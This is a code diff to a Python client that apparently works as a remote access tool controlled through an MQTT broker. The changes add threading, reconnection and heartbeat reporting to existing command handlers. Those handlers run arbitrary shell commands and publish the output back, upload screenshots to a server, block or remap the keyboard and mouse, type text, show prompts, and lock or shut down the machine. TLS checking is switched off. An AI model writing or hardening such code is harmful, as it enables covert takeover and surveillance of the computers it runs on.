@@ -13,6 +13,7 @@ import shutil
 from pathlib import Path
 import sys
 import ssl
+import traceback
 
 # Function imports
 import blockInput
@@ -69,82 +70,136 @@ def take_screenshot():
         filename = f"{pc_name}_screenshot.png"
         pg.screenshot(filename)
         with open(filename, "rb") as f:
-            requests.post(f"{serverUrl}/upload", files={"screenshot": f})
+            requests.post(f"{serverUrl}/upload", files={"screenshot": f}, timeout=5)
         os.remove(filename)
-    except:
-        pass
+    except Exception as e:
+        print(f"[screenshot error] {e}")
+
+
+def safe_thread(target, *args, **kwargs):
+    def wrapper():
+        try:
+            target(*args, **kwargs)
+        except Exception as e:
+            print(f"[ERROR] {target.__name__}: {e}")
+            traceback.print_exc()
+    t = threading.Thread(target=wrapper, daemon=True)
+    t.start()
 
 # Handle all messages
 def handle_msg(msg):
     try:
-        msg = msg.lower()
+        msg = msg.strip().lower()
+
         if msg == "block":
-            blockInput.start_block("both")
+            safe_thread(blockInput.start_block, "both")
         elif msg == "blockkeyboard":
-            blockInput.start_block("keyboard")
+            safe_thread(blockInput.start_block, "keyboard")
         elif msg == "blockmouse":
-            blockInput.start_block("mouse")
+            safe_thread(blockInput.start_block, "mouse")
         elif msg == "unblock":
-            blockInput.unblock_all()
+            safe_thread(blockInput.unblock_all)
         elif msg == "shutdown":
-            os.system("shutdown /s /t 0")
+            safe_thread(os.system, "shutdown /s /t 0")
         elif msg == "desktop":
-            pg.hotkey("win", "d")
+            safe_thread(pg.hotkey, "win", "d")
         elif msg == "close":
-            keyboard.send("alt+f4")
+            safe_thread(keyboard.send, "alt+f4")
         elif msg == "screenshot":
-            take_screenshot()
+            safe_thread(take_screenshot)
         elif msg == "lock":
-            os.system("rundll32.exe user32.dll,LockWorkStation")
+            safe_thread(os.system, "rundll32.exe user32.dll,LockWorkStation")
+        elif msg == "cut":
+            safe_thread(pg.press, "backspace")
         elif msg == "end":
             os._exit(0)
+
         elif msg.startswith("subprocess"):
-            try:
-                subprocess.run(msg[len("subprocess "):], shell=True)
-            except:pass    
+            cmd = msg[len("subprocess "):]
+            safe_thread(subprocess.run, cmd, shell=True)
+
         elif msg.startswith("browser"):
-            webbrowser.open(msg[len("browser "):])
+            url = msg[len("browser "):]
+            safe_thread(webbrowser.open, url)
+
         elif msg.startswith("type"):
-            pg.typewrite(msg[len("type "):], 0.2)
+            text = msg[len("type "):]
+            safe_thread(pg.typewrite, text, 0.2)
+
         elif msg.startswith("notepadtypeheart"):
-            notepad_write(msg[len("notepadtypeheart "):], True)
+            text = msg[len("notepadtypeheart "):]
+            safe_thread(notepad_write, text, True)
+
         elif msg.startswith("notepadtype"):
-            notepad_write(msg[len("notepadtype "):], False)
+            text = msg[len("notepadtype "):]
+            safe_thread(notepad_write, text, False)
+
         elif msg.startswith("press"):
-            pg.press(msg[len("press "):])
+            key = msg[len("press "):]
+            safe_thread(pg.press, key)
+
         elif msg.startswith("alertprompt"):
-            alertPrompt(msg[len("alertprompt "):])
+            text = msg[len("alertprompt "):]
+            safe_thread(alertPrompt, text)
+
         elif msg.startswith("inputprompt"):
-            value = inputPrompt(msg[len("inputprompt "):])
-            client.publish(ACK_TOPIC, value)
+            text = msg[len("inputprompt "):]
+            def handle_input():
+                value = inputPrompt(text)
+                client.publish(ACK_TOPIC, value)
+            safe_thread(handle_input)
+
         elif msg.startswith("backspace"):
-            for _ in range(int(msg[len("backspace "):])):
-                pg.press("backspace")
-                time.sleep(0.05)
+            count = int(msg[len("backspace "):])
+            def backspacer():
+                for _ in range(count):
+                    pg.press("backspace")
+                    time.sleep(0.05)
+            safe_thread(backspacer)
+
         elif msg.startswith("blockkey"):
-            keyboard.block_key(msg[len("blockkey "):])
+            key = msg[len("blockkey "):]
+            safe_thread(keyboard.block_key, key)
+
         elif msg.startswith("unblockkey"):
-            keyboard.unblock_key(msg[len("unblockkey "):])
+            key = msg[len("unblockkey "):]
+            safe_thread(keyboard.unblock_key, key)
+
         elif msg.startswith("remap"):
-            keyboard.remap_key(msg[len("remap "):][0], msg[len("remap "):][1])
+            parts = msg[len("remap "):].split()
+            if len(parts) == 2:
+                safe_thread(keyboard.remap_key, parts[0], parts[1])
+
         elif msg.startswith("swapkey"):
-            try:
-                s = msg[len("swapkey "):].split()
-                keyboard.remap_key(s[0], s[1])
-                keyboard.remap_key(s[1], s[0])
-            except:pass
+            parts = msg[len("swapkey "):].split()
+            if len(parts) == 2:
+                def swap():
+                    keyboard.remap_key(parts[0], parts[1])
+                    keyboard.remap_key(parts[1], parts[0])
+                safe_thread(swap)
+
         elif msg.startswith("cmdwithoutput"):
-            try:
-                result = subprocess.run(msg[len("cmdwithoutput "):], shell=True, capture_output=True, text=True)
-                client.publish(ACK_TOPIC, result.stdout)
-            except:pass
+            cmd = msg[len("cmdwithoutput "):]
+            def cmd_exec():
+                try:
+                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
+                    client.publish(ACK_TOPIC, result.stdout)
+                except Exception as e:
+                    client.publish(ACK_TOPIC, f"Error: {e}")
+            safe_thread(cmd_exec)
+
     except Exception as e:
-        print(e)
+        print(f"[FATAL ERROR in handle_msg]: {e}")
+        traceback.print_exc()
+
 
 # Send initial trace
+TRACE_TOPIC = f"trace/{pc_id}"
 def send_data():
     try:
         requests.get(f"{serverUrl}/posttrace", params={"pc_id": pc_id})
+        client.publish(TRACE_TOPIC, f"TRACE:{pc_id}")
+        print("sent")
     except:
         pass
 
@@ -173,34 +228,30 @@ client.tls_insecure_set(True)
 client.on_connect = on_connect
 client.on_message = on_message
 
-
-# client.connect(BROKER, PORT, 60)
-
-# client.loop_forever()
-
-while True:
-    try:
-        client.connect(BROKER, PORT, 60)
-        client.loop_forever()
-    except Exception as e:
-        print(f"MQTT connection failed: {e}. Retrying in 5 seconds...")
-        time.sleep(5)
-
-# Poll server loop
-# def poll_loop():
-#     while True:
-#         if should_connect():
-#             if not client.is_connected():
-#                 print(f"{pc_id}: Server says connect -> Connecting MQTT")
-#                 client.reconnect()  # reconnect if disconnected
-#         else:
-#             if client.is_connected():
-#                 print(f"{pc_id}: Server says No connect -> Disconnecting MQTT")
-#                 client.disconnect()
-#         time.sleep(POLL_INTERVAL)
+HEARTBEAT_INTERVAL = 20
+HEARTBEAT_TOPIC = f"heartbeat/{pc_id}"
+def heartbeat_loop():
+    while True:
+        try:
+            if client.is_connected():
+                client.publish(HEARTBEAT_TOPIC,"1")
+        except Exception as e:
+            print(e)
+        time.sleep(HEARTBEAT_INTERVAL)  
+threading.Thread(target=heartbeat_loop,daemon=True).start()   
 
 
-# threading.Thread(target=poll_loop, daemon=True).start()
+def connect_mqtt():
+    while True:
+        try:
+            client.connect(BROKER, PORT, 60)
+            break
+        except Exception as e:
+            print(f"MQTT connection failed: {e}, retrying in 5s...")
+            time.sleep(5)
 
-# Run MQTT loop
+connect_mqtt()
+client.loop_forever()
+
+
 
